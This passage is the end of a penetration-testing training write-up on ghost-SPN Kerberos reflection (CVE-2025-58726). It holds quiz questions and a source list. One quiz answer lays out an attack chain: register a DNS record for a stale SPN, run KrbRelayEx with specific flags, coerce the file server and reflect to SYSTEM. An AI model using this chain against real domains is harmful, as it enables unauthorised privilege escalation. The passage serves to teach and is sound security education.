**Comprehension.** Why does the CVE-2025-33073 (June 2025) client-side patch fail to stop the ghost-SPN attack?
- A) The patch was never shipped to servers
- B) Ghost SPNs use NTLM, which the patch ignores
- C) The 33073 fix rejects target names carrying *marshalled target info*; a ghost SPN uses a genuine registered name with no marker, so the check never fires, and the reflection happens server-side ✅
- D) The patch only applies to domain controllers

**Application.** You find `CIFS/OLDFS01` on computer account `FS03$`; `OLDFS01` does not resolve. `nxc smb FS03` shows `signing:False`, and you can add a DNS record as a normal user. What is the correct conclusion and next step?
- A) Not exploitable — SPNs on computer accounts can't be relayed
- B) Exploitable candidate — register `OLDFS01`→your relay, stand up KrbRelayEx with `-spn CIFS/OLDFS01 -redirectserver <FS03-IP>`, then coerce `FS03` and reflect to SYSTEM ✅
- C) Only Kerberoastable — request the ticket and crack `FS03$` offline
- D) Exploitable only if you are already Domain Admin

**Challenge (open-ended).** The October 2025 patch adds a server-side loopback check in `srv2.sys` but leaves the Kerberos reflection root cause intact. Design an engagement methodology to determine whether a *fully patched* estate is still exposed to ghost-SPN reflection against **non-SMB** Kerberos services (e.g., HTTP/ADCS, LDAP). What would you enumerate, what would make such a target exploitable vs theoretical, and how would you demonstrate impact safely within scope?

---

## 9. Sources

**Primary**
- Semperis / Andrea Pierini — *Exploiting Ghost SPNs and Kerberos Reflection for SMB Server Privilege Elevation*: https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/
- MITRE CVE record, CVE-2025-58726 (CVSS/affected/dates): https://cveawg.mitre.org/api/cve/CVE-2025-58726
- Microsoft MSRC advisory, CVE-2025-58726: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-58726
- Synacktiv — *NTLM reflection is dead, long live NTLM reflection! (CVE-2025-33073)*: https://synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
- Synacktiv — *Bypassing authentication reflection mitigations for SYSTEM shells* (Black Hat Asia 2026 slides): https://i.blackhat.com/Asia-26/Presentations/BHAS26-Andre-Bypass-Auth-Reflect-Mitigations-REV01.pdf
- KrbRelayEx (decoder-it) — tool & README: https://github.com/decoder-it/KrbRelayEx

**Microsoft documentation**
- SMB signing (defaults, enforcement): https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing
- Service Principal Names (format/registration): https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names
- Secure Dynamic Update / AD-integrated zone ACL: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc961412(v=technet.10)

**Supporting / detection**
- NetSPI (Kevin Robertson) — ADIDNS exploitation: https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/
- Elastic — *Creation of a DNS-Named Record* detection rule: https://www.elastic.co/guide/en/security/current/creation-of-a-dns-named-record.html
- CISA KEV catalog (CVE-2025-33073 listing): https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- GuidePoint — CISA warns CVE-2025-33073 under active exploitation: https://www.guidepointsecurity.com/newsroom/cisa-warns-of-windows-smb-flaw-under-active-exploitation-cve-2025-33073/

**Name-collision (distinct technique)**
- Trellix — *Ghost SPN Attack* (stealthy Kerberoasting; NOT CVE-2025-58726): https://www.trellix.com/blogs/research/ghost-spn-attack-kerberoasting-detection-trellix-ndr/

**Secondary-only / flagged (do not rely on without primary)**
- SSOJet (CVSS 8.8 attributed to 58726 — likely conflated with 33073): https://ssojet.com/news/kerberos-reflection-exploiting-ghost-spns-for-smb-privilege-elevation
- Senserva (AI-generated CVSS 9.9 — incorrect): https://senserva.com/cve/CVE-2025-58726.html
- Start with Identity (CVE-2025-58726 summary; KEV claim unconfirmed): https://startwithidentity.com/cves/cve-2025-58726.md
- Cybersecurity News coverage: https://cybersecuritynews.com/ghost-spns-and-kerberos-reflection-attack/

---

*Compiled from the sources above. Every factual claim is cited; where a primary source was silent (e.g., exact AP-REQ packet fields, in-the-wild use of 58726) that is stated rather than inferred. Standard Kerberos/AD background (SPN mapping, machine-account→SYSTEM) is marked as background knowledge, corroborated by Microsoft docs where cited.*
